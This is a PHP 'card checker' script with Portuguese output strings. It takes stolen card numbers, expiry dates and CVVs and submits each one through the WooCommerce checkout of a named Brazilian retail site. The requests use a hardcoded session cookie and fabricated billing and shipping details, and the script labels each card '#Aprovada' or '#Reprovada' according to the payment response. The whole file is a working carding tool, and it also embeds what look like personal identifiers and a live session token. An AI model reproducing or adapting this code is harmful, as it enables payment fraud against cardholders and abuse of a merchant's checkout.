<?php
$time = time();

    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function puxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }
$bin1 = substr($cc, 0, 6); 
$file = 'bins.csv'; 
$searchfor = $bin1; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
    $encontrada = implode("\n", $matches[0]); 
}
$pieces = explode(";", $encontrada); 
$c = count($pieces);
if ($c == 8) { 
    $pais = $pieces[4]; 
    $paiscode = $pieces[5]; 
    $banco = $pieces[2]; 
    $level = $pieces[3]; 
    $bandeira = $pieces[1]; 
} else { 
    $pais = $pieces[5]; 
    $paiscode = $pieces[6]; 
    $link = $pieces[7]; 
    $level = $pieces[4]; 
    $banco = $pieces[2]; 
    $bandeira = $pieces[1]; 
}


if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $cc,$lista)){
die('Reprovada » <span class="text-danger">Não foi informado uma lista.</span><br>');
}


if (file_exists(getcwd()."/cookies.txt")) {
        unlink(getcwd()."/cookies.txt");
    }




$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, "https://vanmax.com.br/varejo/?wc-ajax=checkout");
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: wordpress_logged_in_c68295e1891a2cc72afab48ecaadf7c1=serverbrcomputer2025%7C1659287039%7CYBbQccy2uSOdWLoGvBVH71fXOiJShFpCCBGpCeeU3tg%7Cd7a8834bcb087117fd4aeddd49cbc849193d23d2c822c7025833a49aee81baf8; wp_woocommerce_session_c68295e1891a2cc72afab48ecaadf7c1=115%7C%7C1658250397%7C%7C1658246797%7C%7C0eb63dcb3278c217c32e8277ff67676f; et-editor-available-post-1785-fb=fb; woocommerce_recently_viewed=244322%7C240937; woocommerce_items_in_cart=1; woocommerce_cart_hash=bee15112be28b0cdb8b678438dc584d5; gtag_logged_in=true; nitroCachedPage=0; wooptpmReferrer=vanmaxvarejo.com.br',
'origin: https://vanmax.com.br',
'referer: https://vanmax.com.br/varejo/finalizar-compra/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.74',
'x-requested-with: XMLHttpRequest'

));
curl_setopt($ini, CURLOPT_POSTFIELDS, 'billing_first_name=Marcos&billing_last_name=Santos&billing_persontype=1&billing_cpf=331.839.828-46&billing_company=&billing_cnpj=&billing_country=BR&billing_postcode=15550-000&billing_address_1=Frederico+raia&billing_number=556&billing_address_2=Casa&billing_neighborhood=Cohab&billing_city=Am%C3%A9rico+de+Campos&billing_state=SP&billing_phone=(11)+3837-1260&billing_cellphone=(11)+3837-1260&billing_email=serverbrcomputer2025%40gmail.com&ship_to_different_address=1&shipping_first_name=Marcio&shipping_last_name=Averiguar&shipping_company=Fastme&shipping_country=BR&shipping_postcode=69029-340&shipping_address_1=Rua+Veiga+Miranda&shipping_number=1020&shipping_address_2=&shipping_neighborhood=Santo+Ant%C3%B4nio&shipping_city=Manaus&shipping_state=AM&order_comments=&shipping_method%5B0%5D=local_pickup%3A81&payment_method=rede_credit&rede_credit_number='.$cc.'&rede_credit_holder_name=marcos+santos&rede_credit_expiry='.$mes.'+%2F+'.$ano.'&rede_credit_cvc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=f9c3a7079a&_wp_http_referer=%2Fvarejo%2F%3Fwc-ajax%3Dupdate_order_review');
  $meupiru = curl_exec($ini);
//$id_do_carai = puxar($exec, '"id": "', '"');



$retorno = puxar($meupiru, '<\/strong>','\t\t<\/li>');



if(strpos($meupiru, "Unsuccessful. Please, contact Rede.")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

elseif(strpos($meupiru, "A data de validade deve conter 2 ou 4 d\u00edgitos")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

elseif(strpos($meupiru, "A data de validade do cart\u00e3o deve ser futura.")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

elseif(strpos($meupiru, "N\u00e3o h\u00e1 unidades suficientes de Jarra de Vidro 600ml dispon\u00edveis em estoque para atender a esse pedido.")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> N\u00e3o h\u00e1 unidades suficientes de Jarra de Vidro 600ml dispon\u00edveis em estoque para atender a esse pedido. » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

elseif(strpos($meupiru, "Cart\u00e3o de Cr\u00e9dito Inv\u00e1lido")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

elseif(strpos($meupiru, "Inv\u00e1lida Data de Expira\u00e7\u00e3o do Cart\u00e3o de Cr\u00e9dito")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

else{

    echo "<span class='badge badge-success'>#Aprovada</span> ✔ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> Transacao success » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

?>